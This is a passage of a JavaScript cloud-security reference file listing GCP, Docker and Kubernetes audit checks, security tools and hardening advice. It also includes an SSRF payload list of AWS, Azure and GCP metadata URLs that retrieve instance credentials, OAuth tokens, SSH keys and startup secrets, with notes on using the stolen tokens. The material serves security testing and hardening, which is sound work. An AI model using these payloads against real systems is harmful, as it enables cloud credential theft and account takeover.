    command: "gsutil ls -p PROJECT_ID | while read bucket; do ua=$(gsutil uniformbucketlevelaccess get $bucket 2>/dev/null | grep -c Enabled); [ \"$ua\" = \"0\" ] && echo \"NOT UNIFORM: $bucket\"; done",
    tool: "gsutil",
    risk: "medium"
  },
  {
    name: "gcp-storage-versioning",
    description: "Check if object versioning is enabled for data protection and recovery",
    command: "gsutil ls -p PROJECT_ID | while read bucket; do ver=$(gsutil versioning get $bucket 2>/dev/null | grep -c Enabled); [ \"$ver\" = \"0\" ] && echo \"NO VERSIONING: $bucket\"; done",
    tool: "gsutil",
    risk: "medium"
  },

  // -- GKE --
  {
    name: "gke-legacy-abac",
    description: "Detect GKE clusters with legacy ABAC authorization enabled instead of RBAC",
    command: "gcloud container clusters list --project PROJECT_ID --format='table(name,legacyAbac.enabled)' --filter='legacyAbac.enabled=true'",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gke-master-authorized-networks",
    description: "Check if GKE clusters restrict API server access to authorized networks only",
    command: "gcloud container clusters list --project PROJECT_ID --format='table(name,masterAuthorizedNetworksConfig.enabled)'",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gke-network-policy",
    description: "Identify GKE clusters without network policy enforcement, allowing unrestricted pod-to-pod traffic",
    command: "gcloud container clusters list --project PROJECT_ID --format='table(name,networkPolicy.enabled)'",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gke-private-cluster",
    description: "Find GKE clusters with public endpoint access where the control plane is internet-exposed",
    command: "gcloud container clusters list --project PROJECT_ID --format='table(name,privateClusterConfig.enablePrivateEndpoint)' --filter='NOT privateClusterConfig.enablePrivateEndpoint=true'",
    tool: "gcloud",
    risk: "high"
  },

  // -- Cloud SQL --
  {
    name: "gcp-sql-public-ip",
    description: "Detect Cloud SQL instances with public IP addresses and no authorized networks configured",
    command: "gcloud sql instances list --project PROJECT_ID --format='table(name,ipAddresses[].type,settings.ipConfiguration.authorizedNetworks)' --filter='settings.ipConfiguration.ipv4Enabled=true'",
    tool: "gcloud",
    risk: "critical"
  },
  {
    name: "gcp-sql-no-ssl",
    description: "Identify Cloud SQL instances that do not require SSL for client connections",
    command: "gcloud sql instances list --project PROJECT_ID --format='table(name,settings.ipConfiguration.requireSsl)'",
    tool: "gcloud",
    risk: "high"
  },
  {
    name: "gcp-audit-logs",
    description: "Verify that data access audit logs are enabled for critical services",
    command: "gcloud projects get-iam-policy PROJECT_ID --format=json | python3 -c \"import sys,json; p=json.load(sys.stdin); configs=p.get('auditConfigs',[]); [print(c['service'],l['logType']) for c in configs for l in c.get('auditLogConfigs',[])]\"",
    tool: "gcloud",
    risk: "high"
  }
];

// ---------------------------------------------------------------------------
// 4. CONTAINER_SECURITY — 25 checks for Docker, Kubernetes, and container
//    runtime security.
// ---------------------------------------------------------------------------

const CONTAINER_SECURITY = [
  // -- Docker --
  {
    name: "docker-socket-exposure",
    description: "Detect containers with the Docker socket mounted, allowing full host Docker API control and container escape",
    check: "docker ps --format '{{.ID}} {{.Mounts}}' | grep '/var/run/docker.sock'",
    tool: "docker-cli",
    remediation: "Never mount the Docker socket into containers. Use Docker-in-Docker (dind) with TLS or a purpose-built API proxy like Tecnativa/docker-socket-proxy with restricted capabilities."
  },
  {
    name: "docker-privileged-containers",
    description: "Find containers running in privileged mode with full host kernel capabilities",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} Privileged={{.HostConfig.Privileged}}' | grep 'Privileged=true'",
    tool: "docker-cli",
    remediation: "Remove --privileged flag. Grant only specific capabilities with --cap-add. Use seccomp and AppArmor profiles to restrict syscalls."
  },
  {
    name: "docker-root-user",
    description: "Identify containers running as root (UID 0), increasing the impact of container breakout vulnerabilities",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} User={{.Config.User}}' | grep -E 'User=$|User=0|User=root'",
    tool: "docker-cli",
    remediation: "Add USER directive in Dockerfile to run as non-root. Use --user flag at runtime. Set runAsNonRoot: true in Kubernetes security context."
  },
  {
    name: "docker-image-scan",
    description: "Scan container images for known CVEs using Trivy",
    check: "trivy image --severity HIGH,CRITICAL IMAGE_NAME:TAG",
    tool: "trivy",
    remediation: "Update base images regularly. Use minimal base images (distroless, alpine). Pin image digests rather than mutable tags. Integrate scanning into CI/CD pipelines."
  },
  {
    name: "docker-no-healthcheck",
    description: "Find containers without HEALTHCHECK defined, reducing orchestrator awareness of container state",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} Healthcheck={{.Config.Healthcheck}}' | grep 'Healthcheck=<nil>'",
    tool: "docker-cli",
    remediation: "Add HEALTHCHECK instruction to Dockerfiles. Define livenessProbe and readinessProbe in Kubernetes pod specs."
  },
  {
    name: "docker-host-network",
    description: "Detect containers using host network mode, bypassing container network isolation",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} NetworkMode={{.HostConfig.NetworkMode}}' | grep 'NetworkMode=host'",
    tool: "docker-cli",
    remediation: "Use bridge or overlay networks. Only use host networking when absolutely required for performance and never in multi-tenant environments."
  },
  {
    name: "docker-host-pid",
    description: "Find containers sharing the host PID namespace, able to see and signal host processes",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} PidMode={{.HostConfig.PidMode}}' | grep 'PidMode=host'",
    tool: "docker-cli",
    remediation: "Avoid --pid=host unless debugging. Sharing the host PID namespace allows container processes to inspect and send signals to host processes."
  },
  {
    name: "docker-capabilities",
    description: "Audit added Linux capabilities that may enable container escape or privilege escalation",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} CapAdd={{.HostConfig.CapAdd}}' | grep -v 'CapAdd=\\[\\]' | grep -v 'CapAdd=<nil>'",
    tool: "docker-cli",
    remediation: "Drop all capabilities (--cap-drop ALL) and add only those specifically needed. Dangerous capabilities: SYS_ADMIN, SYS_PTRACE, NET_ADMIN, SYS_RAWIO."
  },
  {
    name: "docker-writable-rootfs",
    description: "Identify containers without read-only root filesystems, increasing the attack surface for file-based exploits",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} ReadonlyRootfs={{.HostConfig.ReadonlyRootfs}}' | grep 'ReadonlyRootfs=false'",
    tool: "docker-cli",
    remediation: "Use --read-only flag and mount writable tmpfs volumes only where needed. In Kubernetes set readOnlyRootFilesystem: true in the security context."
  },
  {
    name: "docker-latest-tag",
    description: "Find containers using the 'latest' tag which is mutable and may introduce unexpected changes",
    check: "docker ps --format '{{.Image}}' | grep ':latest\\|:$' | sort -u",
    tool: "docker-cli",
    remediation: "Pin images to specific version tags or SHA256 digests. Use image digest pinning in production: IMAGE_NAME@sha256:DIGEST"
  },
  {
    name: "docker-secrets-in-env",
    description: "Scan container environment variables for potential secrets, API keys, or tokens",
    check: "docker ps -q | xargs docker inspect --format '{{.Name}} {{range .Config.Env}}{{println .}}{{end}}' | grep -iE 'password|secret|token|api_key|private_key|credentials'",
    tool: "docker-cli",
    remediation: "Use Docker secrets, Kubernetes secrets, or external secret managers (Vault, AWS Secrets Manager). Never pass secrets via environment variables in production."
  },

  // -- Kubernetes --
  {
    name: "k8s-rbac-cluster-admin",
    description: "Identify non-system subjects with cluster-admin role binding, granting unrestricted cluster access",
    check: "kubectl get clusterrolebindings -o json | python3 -c \"import sys,json; crbs=json.load(sys.stdin); [print(crb['metadata']['name'],s.get('name',''),s.get('kind','')) for crb in crbs['items'] if crb['roleRef']['name']=='cluster-admin' for s in crb.get('subjects',[]) if not s.get('name','').startswith('system:')]\"",
    tool: "kubectl",
    remediation: "Remove unnecessary cluster-admin bindings. Create namespaced roles with specific resource and verb permissions. Use RBAC audit tools like rakkess or rbac-lookup."
  },
  {
    name: "k8s-pod-security-standards",
    description: "Check if Pod Security Standards (PSS) enforcement is configured at the namespace level",
    check: "kubectl get namespaces -o json | python3 -c \"import sys,json; ns=json.load(sys.stdin); [print(n['metadata']['name'],'NO PSS LABELS') for n in ns['items'] if not any(k.startswith('pod-security.kubernetes.io/') for k in n['metadata'].get('labels',{}))]\"",
    tool: "kubectl",
    remediation: "Label namespaces with Pod Security Standards: kubectl label namespace NS pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/warn=restricted"
  },
  {
    name: "k8s-privileged-pods",
    description: "Detect pods running with privileged security context or elevated capabilities",
    check: "kubectl get pods --all-namespaces -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['namespace'],p['metadata']['name'],c['name']) for p in pods['items'] for c in p['spec'].get('containers',[]) if c.get('securityContext',{}).get('privileged')]\"",
    tool: "kubectl",
    remediation: "Remove privileged: true from security contexts. Use Pod Security Standards at the 'restricted' level. Implement OPA Gatekeeper or Kyverno policies."
  },
  {
    name: "k8s-host-path-volumes",
    description: "Find pods mounting hostPath volumes, which can expose host filesystem data to containers",
    check: "kubectl get pods --all-namespaces -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['namespace'],p['metadata']['name'],v['name'],v['hostPath']['path']) for p in pods['items'] for v in p['spec'].get('volumes',[]) if 'hostPath' in v]\"",
    tool: "kubectl",
    remediation: "Avoid hostPath volumes. Use PersistentVolumeClaims (PVC) with CSI drivers. If hostPath is required, set readOnly: true and use the most restrictive type."
  },
  {
    name: "k8s-network-policies",
    description: "Identify namespaces without any network policies, allowing unrestricted pod-to-pod communication",
    check: "for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l); [ \"$count\" -eq 0 ] && echo \"NO NETWORK POLICY: $ns\"; done",
    tool: "kubectl",
    remediation: "Implement default-deny network policies in each namespace and explicitly allow required traffic. Use a CNI plugin that supports NetworkPolicy (Calico, Cilium)."
  },
  {
    name: "k8s-secrets-unencrypted-etcd",
    description: "Check if Kubernetes secrets are encrypted at rest in etcd",
    check: "kubectl get --raw /api/v1/namespaces/kube-system/configmaps/kubeadm-config -o jsonpath='{.data.ClusterConfiguration}' 2>/dev/null | grep -A5 encryptionConfiguration",
    tool: "kubectl",
    remediation: "Configure etcd encryption with an EncryptionConfiguration resource using aescbc or secretbox provider. Rotate encryption keys regularly."
  },
  {
    name: "k8s-service-account-tokens",
    description: "Detect pods that automount service account tokens unnecessarily, increasing credential exposure",
    check: "kubectl get pods --all-namespaces -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['namespace'],p['metadata']['name']) for p in pods['items'] if p['spec'].get('automountServiceAccountToken',True) and p['spec'].get('serviceAccountName','default')=='default']\"",
    tool: "kubectl",
    remediation: "Set automountServiceAccountToken: false on pods and service accounts that do not need API access. Create dedicated service accounts with minimal RBAC permissions."
  },
  {
    name: "k8s-image-pull-policy",
    description: "Find containers with imagePullPolicy set to IfNotPresent or Never, which may use stale or tampered images",
    check: "kubectl get pods --all-namespaces -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['namespace'],p['metadata']['name'],c['name'],c.get('imagePullPolicy','default')) for p in pods['items'] for c in p['spec'].get('containers',[]) if c.get('imagePullPolicy')!='Always']\"",
    tool: "kubectl",
    remediation: "Set imagePullPolicy: Always for production workloads. Pin images to SHA256 digests to ensure immutability regardless of pull policy."
  },
  {
    name: "k8s-resource-limits",
    description: "Identify pods without CPU/memory resource limits, risking noisy-neighbor issues and DoS",
    check: "kubectl get pods --all-namespaces -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['namespace'],p['metadata']['name'],c['name']) for p in pods['items'] for c in p['spec'].get('containers',[]) if not c.get('resources',{}).get('limits')]\"",
    tool: "kubectl",
    remediation: "Set resource requests and limits for all containers. Use LimitRange objects to enforce namespace-level defaults."
  },
  {
    name: "k8s-tiller-deployed",
    description: "Detect legacy Helm Tiller deployments which run with cluster-admin privileges by default",
    check: "kubectl get deployments --all-namespaces -o json | python3 -c \"import sys,json; deps=json.load(sys.stdin); [print(d['metadata']['namespace'],d['metadata']['name']) for d in deps['items'] if 'tiller' in d['metadata']['name'].lower()]\"",
    tool: "kubectl",
    remediation: "Upgrade to Helm 3 which eliminated Tiller entirely. If Tiller must remain, restrict its service account permissions and network access."
  },
  {
    name: "k8s-dashboard-exposed",
    description: "Check if the Kubernetes dashboard is exposed externally without authentication",
    check: "kubectl get svc --all-namespaces | grep -i dashboard; kubectl get ingress --all-namespaces | grep -i dashboard",
    tool: "kubectl",
    remediation: "Never expose the Kubernetes dashboard publicly. Use kubectl proxy for local access. If external access is needed, protect with OIDC authentication and RBAC."
  },
  {
    name: "k8s-pod-security-context",
    description: "Detect pods running as root or without a security context that enforces non-root execution",
    check: "kubectl get pods --all-namespaces -o json | python3 -c \"import sys,json; pods=json.load(sys.stdin); [print(p['metadata']['namespace'],p['metadata']['name'],c['name']) for p in pods['items'] for c in p['spec'].get('containers',[]) if not c.get('securityContext',{}).get('runAsNonRoot')]\"",
    tool: "kubectl",
    remediation: "Set runAsNonRoot: true and runAsUser to a non-zero UID in the pod or container security context. Use allowPrivilegeEscalation: false."
  },
  {
    name: "k8s-admission-controllers",
    description: "Verify that critical admission controllers are enabled on the API server",
    check: "kubectl get pods -n kube-system -l component=kube-apiserver -o jsonpath='{.items[0].spec.containers[0].command}' | tr ',' '\\n' | grep enable-admission-plugins",
    tool: "kubectl",
    remediation: "Ensure NodeRestriction, PodSecurity, and other security-relevant admission controllers are enabled. Consider adding OPA Gatekeeper or Kyverno for custom policies."
  },
  {
    name: "k8s-etcd-encryption",
    description: "Verify that etcd communication is encrypted with TLS and client certificates",
    check: "kubectl get pods -n kube-system -l component=etcd -o jsonpath='{.items[0].spec.containers[0].command}' | tr ',' '\\n' | grep -E 'cert-file|key-file|trusted-ca-file|peer-cert|peer-key'",
    tool: "kubectl",
    remediation: "Configure etcd with TLS certificates for both client-server and peer-to-peer communication. Rotate certificates before expiry."
  }
];

// ---------------------------------------------------------------------------
// 5. CLOUD_TOOLS — 20 tools for cloud security testing and auditing.
// ---------------------------------------------------------------------------

const CLOUD_TOOLS = [
  {
    name: "prowler",
    description: "Open-source AWS, Azure, and GCP security assessment tool that runs CIS benchmark checks and generates compliance reports",
    install: "pip3 install prowler || docker pull toniblyx/prowler",
    usage: "prowler aws --severity critical high --compliance cis_2.0_aws --output-formats json-ocsf csv html"
  },
  {
    name: "scoutsuite",
    description: "Multi-cloud security auditing tool that collects configuration data and highlights risky settings across AWS, Azure, GCP, and more",
    install: "pip3 install scoutsuite",
    usage: "scout aws --report-dir ./scout-report --no-browser"
  },
  {
    name: "pacu",
    description: "AWS exploitation framework for penetration testing, supporting credential discovery, privilege escalation, and data exfiltration",
    install: "git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && pip3 install -r requirements.txt",
    usage: "python3 pacu.py  # then: import_keys <profile>, run iam__enum_permissions, run iam__privesc_scan"
  },
  {
    name: "cloudfox",
    description: "Automating situational awareness for cloud penetration testing, enumerating attack paths in AWS and Azure",
    install: "go install github.com/BishopFox/cloudfox@latest || brew install cloudfox",
    usage: "cloudfox aws --profile TARGET_PROFILE all-checks"
  },
  {
    name: "steampipe",
    description: "SQL-based cloud infrastructure querying tool with plugins for AWS, Azure, GCP, and Kubernetes compliance checks",
    install: "brew install turbot/tap/steampipe || sh -c \"$(curl -fsSL https://steampipe.io/install/steampipe.sh)\"",
    usage: "steampipe check aws_compliance.benchmark.cis_v200 --output json"
  },
  {
    name: "trivy",
    description: "Comprehensive vulnerability scanner for container images, filesystems, git repositories, and IaC configurations",
    install: "brew install trivy || apt-get install trivy || docker pull aquasec/trivy",
    usage: "trivy image --severity HIGH,CRITICAL IMAGE:TAG && trivy config --severity HIGH,CRITICAL ./terraform/"
  },
  {
    name: "kube-hunter",
    description: "Kubernetes penetration testing tool that probes for security weaknesses in cluster configurations and exposed services",
    install: "pip3 install kube-hunter || docker pull aquasec/kube-hunter",
    usage: "kube-hunter --remote TARGET_IP --report json  # or: kube-hunter --pod  (from within a cluster)"
  },
  {
    name: "kube-bench",
    description: "CIS Kubernetes Benchmark checker that audits control plane and worker node configurations against security best practices",
    install: "go install github.com/aquasecurity/kube-bench@latest || docker pull aquasec/kube-bench",
    usage: "kube-bench run --targets master,node --json"
  },
  {
    name: "checkov",
    description: "Static analysis tool for Infrastructure as Code (Terraform, CloudFormation, Kubernetes, Helm) detecting misconfigurations before deployment",
    install: "pip3 install checkov",
    usage: "checkov -d ./terraform/ --framework terraform --output json --check HIGH,CRITICAL"
  },
  {
    name: "terrascan",
    description: "Static code analyzer for Infrastructure as Code to detect compliance and security violations before provisioning",
    install: "brew install terrascan || go install github.com/tenable/terrascan/cmd/terrascan@latest",
    usage: "terrascan scan -i terraform -d ./terraform/ -o json --severity high,critical"
  },
  {
    name: "grype",
    description: "Container image vulnerability scanner that matches discovered packages against multiple vulnerability databases",
    install: "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin",
    usage: "grype IMAGE:TAG --output json --only-fixed --fail-on high"
  },
  {
    name: "falco",
    description: "Runtime security monitoring for containers and Kubernetes, detecting anomalous system calls and suspicious behavior in real time",
    install: "helm repo add falcosecurity https://falcosecurity.github.io/charts && helm install falco falcosecurity/falco",
    usage: "falco -r /etc/falco/falco_rules.yaml -r /etc/falco/falco_rules.local.yaml --json-output"
  },
  {
    name: "cloudmapper",
    description: "Analyzes AWS environments to create network topology diagrams and identify overly permissive security group rules",
    install: "git clone https://github.com/duo-labs/cloudmapper.git && cd cloudmapper && pip3 install -r requirements.txt",
    usage: "python3 cloudmapper.py collect --account ACCOUNT_NAME && python3 cloudmapper.py report --account ACCOUNT_NAME"
  },
  {
    name: "enumerate-iam",
    description: "Brute-force enumeration of IAM permissions for given AWS credentials by attempting each API action",
    install: "git clone https://github.com/andresriancho/enumerate-iam.git && cd enumerate-iam && pip3 install -r requirements.txt",
    usage: "python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET... --region us-east-1"
  },
  {
    name: "scoutsuite-azure",
    description: "ScoutSuite Azure-specific mode for auditing Azure subscriptions against security best practices",
    install: "pip3 install scoutsuite",
    usage: "scout azure --cli --report-dir ./scout-azure-report"
  },
  {
    name: "azurehound",
    description: "Azure Active Directory and Azure RM data collector for BloodHound attack path analysis",
    install: "go install github.com/BloodHoundAD/AzureHound/v2@latest",
    usage: "azurehound -t TENANT_ID list --tenant TENANT_ID -o output.json"
  },
  {
    name: "gcp-scanner",
    description: "Google Cloud Platform security assessment tool that checks for misconfigurations across GCP services",
    install: "pip3 install gcp-scanner",
    usage: "gcp_scanner --project-id PROJECT_ID --output-format json"
  },
  {
    name: "hadolint",
    description: "Dockerfile linter that validates best practices and detects security anti-patterns in container build files",
    install: "brew install hadolint || docker pull hadolint/hadolint",
    usage: "hadolint Dockerfile --format json --failure-threshold warning"
  },
  {
    name: "dockle",
    description: "Container image security linter that checks for CIS Docker Benchmark compliance and best practice violations",
    install: "brew install goodwithtech/r/dockle || docker pull goodwithtech/dockle",
    usage: "dockle --format json IMAGE:TAG"
  },
  {
    name: "kubiscan",
    description: "Kubernetes RBAC risk scanner that identifies risky ClusterRoles, privilege escalation paths, and overprivileged service accounts",
    install: "git clone https://github.com/cyberark/KubiScan.git && cd KubiScan && pip3 install -r requirements.txt",
    usage: "python3 KubiScan.py --risky-clusterroles --risky-roles --risky-subjects"
  }
];

// ---------------------------------------------------------------------------
// 6. IMDS_PAYLOADS — metadata endpoint payloads for AWS, Azure, and GCP.
//    Used for SSRF testing and cloud-aware penetration testing scenarios.
// ---------------------------------------------------------------------------

const IMDS_PAYLOADS = [
  // -- AWS IMDSv1 (no token required) --
  {
    cloud: "aws",
    url: "http://169.254.169.254/latest/meta-data/",
    description: "AWS IMDS root endpoint listing available metadata categories (IMDSv1, no authentication)",
    data: "Returns directory listing: ami-id, hostname, iam/, instance-id, local-ipv4, public-ipv4, security-groups, etc."
  },
  {
    cloud: "aws",
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    description: "Lists IAM role names attached to the EC2 instance; append role name to retrieve temporary credentials",
    data: "Returns the IAM role name. Follow up with /latest/meta-data/iam/security-credentials/ROLE_NAME to get AccessKeyId, SecretAccessKey, Token."
  },
  {
    cloud: "aws",
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
    description: "Retrieve temporary AWS credentials (access key, secret key, session token) for the instance IAM role",
    data: "JSON: { AccessKeyId, SecretAccessKey, Token, Expiration }. These credentials can be used with aws-cli to access AWS services."
  },
  {
    cloud: "aws",
    url: "http://169.254.169.254/latest/user-data",
    description: "Retrieve EC2 user data which often contains bootstrap scripts, configuration, or embedded secrets",
    data: "Returns raw user-data content (often a bash script or cloud-init YAML). May contain hardcoded credentials, API keys, or database connection strings."
  },
  {
    cloud: "aws",
    url: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    description: "Retrieve EC2 instance identity credentials used for internal AWS service communication",
    data: "JSON: { AccessKeyId, SecretAccessKey, Token }. Separate from IAM role credentials, used by EC2 internal services."
  },
  {
    cloud: "aws",
    url: "http://169.254.169.254/latest/dynamic/instance-identity/document",
    description: "Retrieve the instance identity document containing account ID, region, instance type, and other metadata",
    data: "JSON: { accountId, architecture, availabilityZone, imageId, instanceId, instanceType, privateIp, region, version }."
  },

  // -- AWS IMDSv2 (token required) --
  {
    cloud: "aws",
    url: "curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'",
    description: "IMDSv2 token acquisition; required before any metadata request when IMDSv2 is enforced. The PUT method and custom header block most SSRF exploits.",
    data: "Returns a session token string. Use it in subsequent requests: curl -H 'X-aws-ec2-metadata-token: TOKEN' http://169.254.169.254/latest/meta-data/"
  },

  // -- Azure IMDS --
  {
    cloud: "azure",
    url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    description: "Azure Instance Metadata Service endpoint; requires Metadata: true header to prevent SSRF (but the header is trivially set in many SSRF scenarios)",
    data: "JSON with compute (vmId, location, offer, sku, resourceGroupName, subscriptionId) and network (interface details, public/private IPs) sections."
  },
  {
    cloud: "azure",
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    description: "Retrieve Azure managed identity OAuth2 access token for Azure Resource Manager API access",
    data: "JSON: { access_token, client_id, expires_in, expires_on, resource, token_type }. The access_token grants ARM API access with the VM's managed identity permissions."
  },
  {
    cloud: "azure",
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
    description: "Retrieve Azure managed identity token scoped to Key Vault for secret and key access",
    data: "JSON: { access_token, ... }. Use with: curl -H 'Authorization: Bearer TOKEN' https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3"
  },
  {
    cloud: "azure",
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/",
    description: "Retrieve Azure managed identity token scoped to Azure Storage for blob and file access",
    data: "JSON: { access_token, ... }. Use with Azure Storage REST API to list containers and download blobs."
  },

  // -- GCP IMDS --
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/",
    description: "GCP metadata server root endpoint; requires Metadata-Flavor: Google header",
    data: "Returns directory listing of metadata categories. Add ?recursive=true to get all metadata in one request."
  },
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    description: "Retrieve GCP service account OAuth2 access token for API access with the instance's service account permissions",
    data: "JSON: { access_token, expires_in, token_type }. Use with: curl -H 'Authorization: Bearer TOKEN' https://www.googleapis.com/compute/v1/projects/PROJECT/zones/ZONE/instances"
  },
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://TARGET&format=full",
    description: "Retrieve a GCP identity token (OIDC JWT) for authenticating to other services or Cloud Functions",
    data: "Returns a signed JWT. The audience parameter specifies the intended recipient. Useful for accessing Cloud Run services and Identity-Aware Proxy protected resources."
  },
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
    description: "Retrieve project-wide SSH keys that grant access to all instances in the project unless blocked",
    data: "Returns newline-separated SSH public keys in the format 'username:ssh-rsa KEY comment'. These keys grant SSH access to instances that allow project-wide keys."
  },
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
    description: "Retrieve the instance startup script which may contain embedded secrets or configuration data",
    data: "Returns the raw startup script content. Often contains initialization commands, environment variable exports, and potentially hardcoded credentials."
  },
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    description: "Retrieve the GCP project ID, useful for constructing API requests against the project",
    data: "Returns the plain-text project ID string."
  },
  {
    cloud: "gcp",
    url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    description: "List all service accounts available to the instance, including their email addresses and scopes",
    data: "Returns directory listing of service accounts. Append EMAIL/scopes to check OAuth scopes granted to each account."
  }
];

// ---------------------------------------------------------------------------
// 7. CLOUD_HARDENING — 30 recommendations across AWS, Azure, and GCP
//    with concrete implementation guidance and priority levels.
// ---------------------------------------------------------------------------

const CLOUD_HARDENING = [
  // -- AWS Hardening --
  {
    provider: "aws",
    recommendation: "Enable IMDSv2 on all EC2 instances to prevent SSRF-based credential theft from the metadata service",
    implementation: "aws ec2 modify-instance-metadata-options --instance-id INSTANCE_ID --http-tokens required --http-endpoint enabled. For new instances, set MetadataOptions.HttpTokens=required in launch templates. Deploy an SCP to enforce IMDSv2 across the organization.",
    priority: "critical"
  },
  {
    provider: "aws",
    recommendation: "Enable S3 Block Public Access at the account level to prevent accidental public exposure of any bucket",
    implementation: "aws s3control put-public-access-block --account-id ACCOUNT_ID --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true. Deploy via SCP for organization-wide enforcement.",
    priority: "critical"
  },
  {
    provider: "aws",
    recommendation: "Enable CloudTrail in all regions with log file integrity validation and encryption",
    implementation: "Create an organization trail with multi-region enabled. Enable log file validation and KMS encryption. Send logs to a centralized S3 bucket in a dedicated security account with object lock enabled.",
    priority: "critical"
  },
  {
    provider: "aws",
    recommendation: "Enforce MFA for all IAM users, especially those with console access or administrative privileges",
    implementation: "Create an IAM policy with Condition: aws:MultiFactorAuthPresent that denies all actions except MFA self-management when MFA is not active. Attach to all IAM users. Use hardware MFA for root and break-glass accounts.",
    priority: "critical"
  },
  {
    provider: "aws",
    recommendation: "Enable GuardDuty in all regions and configure automated response for high-severity findings",
    implementation: "Use AWS Organizations to enable GuardDuty across all accounts and regions from a delegated admin account. Configure EventBridge rules to trigger Lambda functions for automated remediation of critical findings.",
    priority: "high"
  },
  {
    provider: "aws",
    recommendation: "Enable VPC Flow Logs for all VPCs to capture network traffic metadata for forensics and anomaly detection",
    implementation: "Create flow logs for each VPC with traffic-type ALL. Send to CloudWatch Logs or S3. Use Athena queries or CloudWatch Insights for analysis. Retain logs for at least 90 days.",
    priority: "high"
  },
  {
    provider: "aws",
    recommendation: "Use AWS Organizations SCPs to enforce security guardrails across all accounts",
    implementation: "Implement deny-based SCPs: prevent disabling CloudTrail, prevent disabling GuardDuty, restrict region usage, prevent leaving the organization, enforce encryption, restrict root account usage.",
    priority: "high"
  },
  {
    provider: "aws",
    recommendation: "Enable EBS encryption by default in all regions to protect data at rest on all new volumes",
    implementation: "aws ec2 enable-ebs-encryption-by-default for each region. Use a KMS CMK for encryption. Deploy via AWS Config rule to detect and remediate non-compliant volumes.",
    priority: "high"
  },
  {
    provider: "aws",
    recommendation: "Implement least-privilege IAM policies using IAM Access Analyzer to right-size permissions",
    implementation: "Enable IAM Access Analyzer in each region. Generate policy recommendations based on CloudTrail access activity. Review and apply scoped-down policies. Set up unused access findings for continuous monitoring.",
    priority: "high"
  },
  {
    provider: "aws",
    recommendation: "Enable AWS Config with conformance packs to continuously audit resource configurations",
    implementation: "Enable AWS Config recording for all resource types in all regions. Deploy conformance packs for CIS AWS Foundations Benchmark. Configure auto-remediation with SSM Automation documents.",
    priority: "medium"
  },
  {
    provider: "aws",
    recommendation: "Implement AWS Secrets Manager with automatic rotation for all database and service credentials",
    implementation: "Migrate hardcoded credentials to Secrets Manager. Configure rotation Lambda functions with 30-day intervals. Use resource policies to restrict access. Enable CloudTrail data events for audit.",
    priority: "medium"
  },
  {
    provider: "aws",
    recommendation: "Use AWS Security Hub to aggregate findings from GuardDuty, Inspector, Config, and third-party tools",
    implementation: "Enable Security Hub with CIS and AWS Foundational Security Best Practices standards. Configure cross-account aggregation. Create custom insights for your specific risk priorities.",
    priority: "medium"
  },

  // -- Azure Hardening --
  {
    provider: "azure",
    recommendation: "Enable Azure Defender (Microsoft Defender for Cloud) across all subscriptions for threat detection",
    implementation: "Enable Defender plans for servers, app services, storage, SQL, Key Vault, ARM, DNS, and containers. Configure email notifications. Review and act on security recommendations with a target secure score of 80+.",
    priority: "critical"
  },
  {
    provider: "azure",
    recommendation: "Enforce Azure AD Conditional Access policies requiring MFA for all users and risky sign-ins",
    implementation: "Create policies requiring MFA for: all cloud apps (with trusted location exceptions), risky sign-ins (medium/high risk), Azure management portal access, and device registration. Block legacy authentication protocols entirely.",
    priority: "critical"
  },
  {
    provider: "azure",
    recommendation: "Restrict Azure storage account access using private endpoints and network rules",
    implementation: "Disable public blob access on all storage accounts. Configure private endpoints for VNet connectivity. Set default network action to Deny with explicit allow rules for required IP ranges and VNets.",
    priority: "critical"
  },
  {
    provider: "azure",
    recommendation: "Enable Azure Key Vault soft delete and purge protection to prevent permanent key and secret loss",
    implementation: "az keyvault update --name VAULT --enable-soft-delete true --enable-purge-protection true. Deploy via Azure Policy to enforce on all new and existing Key Vaults.",
    priority: "high"
  },
  {
